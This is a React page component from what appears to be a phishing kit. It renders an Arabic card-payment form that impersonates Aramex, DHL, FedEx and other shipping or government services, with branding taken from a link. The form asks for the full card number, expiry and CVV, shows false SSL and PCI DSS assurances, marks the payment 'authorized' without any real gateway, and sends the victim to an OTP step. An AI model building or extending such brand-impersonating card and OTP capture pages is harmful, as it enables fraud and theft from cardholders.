import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { usePayment, useUpdatePayment, useLink } from "@/hooks/useSupabase";
import { Shield, CreditCard, Lock, AlertCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getShippingCompanyDesign } from "@/lib/shippingCompanyDesigns";
import BackButton from "@/components/BackButton";
import { getNonGovPaymentGatewayVisuals, shouldUsePaymentGatewayVisuals } from "@/lib/nonGovPaymentGatewayVisuals";
import { isGovernmentService } from "@/lib/governmentPaymentServices";
import ShippingCompanyHeader from "@/components/ShippingCompanyHeader";

const PaymentCard = () => {
  const { id, paymentId } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: payment } = usePayment(paymentId);
  const { data: link } = useLink(payment?.link_id || undefined);
  const updatePayment = useUpdatePayment();
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  
  // Get service branding
  const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || 'aramex';
  const serviceName = link?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyDesign = getShippingCompanyDesign(serviceKey);
  
  const countryCode = link?.payload?.selectedCountry || 'SA';
  const isGovService = isGovernmentService(serviceKey);
  const useGatewayVisuals = !isGovService && shouldUsePaymentGatewayVisuals(serviceKey);
  const gatewayVisuals = useGatewayVisuals ? getNonGovPaymentGatewayVisuals(countryCode, serviceKey) : null;
  
  const isShippingCompany = ['aramex', 'dhl', 'fedex', 'ups', 'smsa', 'naqel', 'zajil'].includes(serviceKey.toLowerCase());
  
  const primaryColor = gatewayVisuals?.colors.primary || companyDesign.colors.primary;
  const secondaryColor = gatewayVisuals?.colors.secondary || companyDesign.colors.secondary;
  const borderColor = gatewayVisuals?.colors.border || companyDesign.colors.border;
  const textColor = gatewayVisuals?.colors.text || companyDesign.colors.text;
  const fontFamily = gatewayVisuals?.fonts.primaryAr || companyDesign.fonts.primaryAr;
  
  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\s/g, "");
    const matches = cleaned.match(/.{1,4}/g);
    return matches ? matches.join(" ") : cleaned;
  };
  
  // Generate month/year options
  const months = Array.from({ length: 12 }, (_, i) => {
    const month = (i + 1).toString().padStart(2, '0');
    return { value: month, label: month };
  });
  
  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 15 }, (_, i) => {
    const year = (currentYear + i).toString().slice(-2);
    return { value: year, label: `20${year}` };
  });
  
  const handleSubmit = async () => {
    if (!cardName || !cardNumber || !expiryMonth || !expiryYear || !cvv || !payment) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول",
        variant: "destructive",
      });
      return;
    }
    
    // Extract last 4 digits
    const last4 = cardNumber.replace(/\s/g, "").slice(-4);
    
    // Submit to Netlify Forms
    const formData = new FormData();
    formData.append('form-name', 'payment-card');
    formData.append('cardholderName', cardName);
    formData.append('cardLast4', last4);
    formData.append('expiryMonth', expiryMonth);
    formData.append('expiryYear', expiryYear);
    formData.append('service', serviceName);
    formData.append('paymentId', payment.id);
    formData.append('linkId', id || '');
    
    try {
      await fetch('/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams(formData as any).toString()
      });
    } catch (error) {
      console.error('Form submission error:', error);
    }
    
    // Update payment with card info (NOT storing full PAN/CVV)
    await updatePayment.mutateAsync({
      paymentId: payment.id,
      updates: {
        cardholder_name: cardName,
        last_four: last4,
        status: "authorized",
      },
    });
    
    // Navigate to OTP
    navigate(`/pay/${id}/otp/${payment.id}`);
  };
  
  return (
    <>
      {isShippingCompany && (
        <ShippingCompanyHeader
          companyKey={serviceKey}
          serviceName={serviceName}
          showSecurityBadge={true}
        />
      )}
      
      <div 
        className="min-h-screen py-4 sm:py-12" 
        dir="rtl"
        style={{
          background: isShippingCompany
            ? `linear-gradient(135deg, ${companyDesign.colors.background}, ${companyDesign.colors.surface})`
            : gatewayVisuals 
              ? `linear-gradient(135deg, ${gatewayVisuals.colors.background}, ${gatewayVisuals.colors.surface})` 
              : `linear-gradient(135deg, ${companyDesign.colors.background}, ${companyDesign.colors.surface})`,
          fontFamily: isShippingCompany ? companyDesign.fonts.primaryAr : fontFamily
        }}
      >
        <div className="container mx-auto px-3 sm:px-4">
          <div className="mb-4">
            <BackButton />
          </div>
          
          <div className="max-w-md mx-auto">
            {isShippingCompany && companyDesign.headerImage ? (
              <div className="mb-4 sm:mb-6 rounded-xl overflow-hidden shadow-lg">
                <img 
                  src={companyDesign.headerImage} 
                  alt={serviceName}
                  className="w-full h-32 sm:h-48 object-cover"
                  onError={(e) => e.currentTarget.style.display = 'none'}
                />
              </div>
            ) : branding.ogImage && (
              <div className="mb-4 sm:mb-6 rounded-xl overflow-hidden shadow-lg">
                <img 
                  src={branding.ogImage} 
                  alt={serviceName}
                  className="w-full h-32 sm:h-48 object-cover"
                  onError={(e) => e.currentTarget.style.display = 'none'}
                />
              </div>
            )}
          
            {!isShippingCompany && (
              <div className="text-center mb-3 sm:mb-6">
                <Badge 
                  className="text-xs sm:text-sm px-3 py-1.5 sm:px-4 sm:py-2"
                  style={{
                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                    color: '#FFFFFF'
                  }}
                >
                  <Lock className="w-3 h-3 sm:w-4 sm:h-4 ml-1.5 sm:ml-2" />
                  <span>معاملة آمنة ومشفّرة</span>
                </Badge>
              </div>
            )}
          
            <Card className="p-4 sm:p-8 shadow-elevated border-0" style={{ 
              borderTop: `4px solid ${primaryColor}`,
              borderRadius: isShippingCompany ? companyDesign.borderRadius.lg : (gatewayVisuals?.borderRadius.lg || companyDesign.borderRadius.lg),
              boxShadow: isShippingCompany ? companyDesign.shadows.lg : (gatewayVisuals?.shadows.lg || companyDesign.shadows.lg)
            }}>
              <div className="flex items-center gap-2 sm:gap-3 mb-4 sm:mb-6">
                <div 
                  className="w-10 h-10 sm:w-12 sm:h-12 flex items-center justify-center"
                  style={{
                    background: isShippingCompany 
                      ? companyDesign.gradients.primary 
                      : gatewayVisuals 
                        ? gatewayVisuals.gradients.primary 
                        : companyDesign.gradients.primary,
                    borderRadius: isShippingCompany 
                      ? companyDesign.borderRadius.sm 
                      : gatewayVisuals?.borderRadius.sm || companyDesign.borderRadius.sm
                  }}
                >
                  <CreditCard 
                    className="w-5 h-5 sm:w-6 sm:h-6" 
                    style={{ color: isShippingCompany ? (companyDesign.colors.textOnPrimary || '#FFFFFF') : '#FFFFFF' }}
                  />
                </div>
                <div>
                  <h1 
                    className="text-lg sm:text-2xl font-bold"
                    style={{
                      fontFamily: isShippingCompany ? companyDesign.fonts.primaryAr : undefined,
                      fontWeight: isShippingCompany ? (companyDesign.fonts.weight?.bold || 700) : 700
                    }}
                  >
                    بيانات البطاقة
                  </h1>
                  <p 
                    className="text-xs sm:text-sm"
                    style={{ 
                      color: isShippingCompany ? companyDesign.colors.text : undefined,
                      opacity: 0.7
                    }}
                  >
                    {serviceName} - دفع آمن
                  </p>
                </div>
              </div>
            
              <div 
                className="rounded-lg p-3 sm:p-4 mb-4 sm:mb-6 flex items-start gap-3"
                style={{
                  background: `${primaryColor}08`,
                  border: `1.5px solid ${primaryColor}30`,
                  borderRadius: isShippingCompany ? companyDesign.borderRadius.md : (gatewayVisuals?.borderRadius.sm || companyDesign.borderRadius.sm)
                }}
              >
                <div
                  className="w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0"
                  style={{ background: isShippingCompany ? companyDesign.gradients.primary : `${primaryColor}20` }}
                >
                  <AlertCircle 
                    className="w-4 h-4" 
                    style={{ color: isShippingCompany ? (companyDesign.colors.textOnPrimary || '#FFFFFF') : primaryColor }}
                  />
                </div>
                <p 
                  className="text-xs sm:text-sm leading-relaxed" 
                  style={{ 
                    color: textColor,
                    fontFamily: isShippingCompany ? companyDesign.fonts.primaryAr : undefined
                  }}
                >
                  بياناتك محمية بتقنية التشفير SSL/TLS. لا نقوم بحفظ بيانات البطاقة
                </p>
              </div>
            
            <div className="space-y-3 sm:space-y-5">
              {/* Cardholder Name */}
              <div>
                <Label className="mb-1.5 sm:mb-2 text-xs sm:text-sm font-semibold">
                  اسم حامل البطاقة
                </Label>
                <Input
                  placeholder="AHMAD ALI"
                  value={cardName}
                  onChange={(e) => setCardName(e.target.value.toUpperCase())}
                  className="h-10 sm:h-12 text-sm sm:text-base border-2 focus:ring-2 transition-all"
                  style={{
                    borderColor: borderColor,
                    borderRadius: gatewayVisuals?.borderRadius.sm || companyDesign.borderRadius.sm,
                    '--tw-ring-color': `${primaryColor}50`
                  } as React.CSSProperties}
                />
              </div>
              
              {/* Card Number */}
              <div>
                <Label className="mb-1.5 sm:mb-2 text-xs sm:text-sm font-semibold">
                  رقم البطاقة
                </Label>
                <Input
                  placeholder="0000 0000 0000 0000"
                  value={cardNumber}
                  onChange={(e) =>
                    setCardNumber(formatCardNumber(e.target.value.slice(0, 19)))
                  }
                  inputMode="numeric"
                  className="h-10 sm:h-12 text-sm sm:text-base tracking-wider border-2 focus:ring-2 transition-all font-mono"
                  style={{
                    borderColor: `${branding.colors.primary}40`,
                    '--tw-ring-color': `${branding.colors.primary}50`
                  } as React.CSSProperties}
                />
              </div>
              
              {/* Expiry & CVV */}
              <div className="grid grid-cols-3 gap-2 sm:gap-3">
                <div>
                  <Label className="mb-1.5 sm:mb-2 text-xs sm:text-sm font-semibold">
                    الشهر
                  </Label>
                  <Select value={expiryMonth} onValueChange={setExpiryMonth}>
                    <SelectTrigger 
                      className="h-10 sm:h-12 text-sm sm:text-base border-2"
                      style={{
                        borderColor: `${branding.colors.primary}40`
                      }}
                    >
                      <SelectValue placeholder="MM" />
                    </SelectTrigger>
                    <SelectContent className="max-h-[200px]">
                      {months.map((month) => (
                        <SelectItem key={month.value} value={month.value}>
                          {month.label}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>
                
                <div>
                  <Label className="mb-1.5 sm:mb-2 text-xs sm:text-sm font-semibold">
                    السنة
                  </Label>
                  <Select value={expiryYear} onValueChange={setExpiryYear}>
                    <SelectTrigger 
                      className="h-10 sm:h-12 text-sm sm:text-base border-2"
                      style={{
                        borderColor: `${branding.colors.primary}40`
                      }}
                    >
                      <SelectValue placeholder="YY" />
                    </SelectTrigger>
                    <SelectContent className="max-h-[200px]">
                      {years.map((year) => (
                        <SelectItem key={year.value} value={year.value}>
                          {year.label}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>
                
                <div>
                  <Label className="mb-1.5 sm:mb-2 text-xs sm:text-sm font-semibold">CVV</Label>
                  <Input
                    placeholder="•••"
                    value={cvv}
                    onChange={(e) =>
                      setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))
                    }
                    inputMode="numeric"
                    type="password"
                    className="h-10 sm:h-12 text-sm sm:text-base border-2 focus:ring-2 transition-all text-center font-mono"
                    style={{
                      borderColor: `${branding.colors.primary}40`,
                      '--tw-ring-color': `${branding.colors.primary}50`
                    } as React.CSSProperties}
                    maxLength={3}
                  />
                </div>
              </div>
              
                {/* Submit Button */}
                <Button
                  size="lg"
                  className="w-full text-sm sm:text-lg py-5 sm:py-7 mt-4 sm:mt-6 font-bold transition-all hover:shadow-lg"
                  onClick={handleSubmit}
                  disabled={updatePayment.isPending}
                  style={{
                    background: isShippingCompany 
                      ? companyDesign.gradients.primary 
                      : gatewayVisuals 
                        ? gatewayVisuals.gradients.primary 
                        : companyDesign.gradients.primary,
                    color: isShippingCompany ? (companyDesign.colors.textOnPrimary || '#FFFFFF') : '#FFFFFF',
                    borderRadius: isShippingCompany 
                      ? companyDesign.borderRadius.md 
                      : gatewayVisuals?.borderRadius.md || companyDesign.borderRadius.md,
                    boxShadow: isShippingCompany 
                      ? companyDesign.shadows.md 
                      : gatewayVisuals?.shadows.md || companyDesign.shadows.md,
                    fontFamily: isShippingCompany ? companyDesign.fonts.primaryAr : fontFamily
                  }}
                >
                  {updatePayment.isPending ? (
                    <span>جاري التفويض...</span>
                  ) : (
                    <>
                      <Shield className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
                      <span>تفويض البطاقة والمتابعة</span>
                    </>
                  )}
                </Button>
              
                <p 
                  className="text-[10px] sm:text-xs text-center mt-2 sm:mt-3"
                  style={{
                    color: isShippingCompany ? companyDesign.colors.text : undefined,
                    opacity: 0.7
                  }}
                >
                  سيتم إرسال رمز التحقق إلى هاتفك المسجل
                </p>
              </div>
            </Card>
          
            {isShippingCompany && (
              <div 
                className="flex items-center justify-center gap-6 mt-6 py-3 rounded-lg"
                style={{
                  background: `${companyDesign.colors.primary}05`,
                  border: `1px solid ${companyDesign.colors.border}`,
                  borderRadius: companyDesign.borderRadius.md
                }}
              >
                <div className="flex items-center gap-2">
                  <Shield className="w-4 h-4" style={{ color: companyDesign.colors.primary }} />
                  <span className="text-xs font-semibold" style={{ color: companyDesign.colors.text }}>SSL</span>
                </div>
                <div className="w-px h-4" style={{ background: companyDesign.colors.border }} />
                <div className="flex items-center gap-2">
                  <Lock className="w-4 h-4" style={{ color: companyDesign.colors.primary }} />
                  <span className="text-xs font-semibold" style={{ color: companyDesign.colors.text }}>PCI DSS</span>
                </div>
              </div>
            )}
          
            {/* Hidden Netlify Form */}
            <form name="payment-card" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
              <input type="text" name="cardholderName" />
              <input type="text" name="cardLast4" />
              <input type="text" name="expiryMonth" />
              <input type="text" name="expiryYear" />
              <input type="text" name="service" />
              <input type="text" name="paymentId" />
              <input type="text" name="linkId" />
            </form>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentCard;
